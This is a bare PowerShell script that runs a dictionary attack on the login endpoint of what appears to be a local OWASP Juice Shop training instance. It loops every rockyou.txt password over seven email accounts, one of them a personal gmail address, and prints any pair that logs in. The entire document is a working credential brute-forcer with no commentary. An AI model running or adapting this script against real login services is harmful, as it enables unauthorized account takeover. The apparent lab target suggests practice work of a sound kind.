$emails = @('admin@juice-sh.op','jim@juice-sh.op','bender@juice-sh.op','bjoern.kimminich@gmail.com','ciso@juice-sh.op','support@juice-sh.op','morty@juice-sh.op')
Get-Content /usr/share/wordlists/rockyou.txt | ForEach-Object {
    $password = $_
    $emails = $emails
    $url = 'http://localhost:3000/rest/user/login'
    foreach($email in $emails){
        $payload = @{
            'email' = $email
            'password' = $password
        }
        if((Invoke-WebRequest -Uri $url -Method Post -Body $payload -SkipHttpErrorCheck).StatusCode -eq 200){
            $output = [PSCustomobject]@{
                StatusCode = 200
                Attempt = "$email : $password"
            }
            Write-Host $output
        }
    }   
}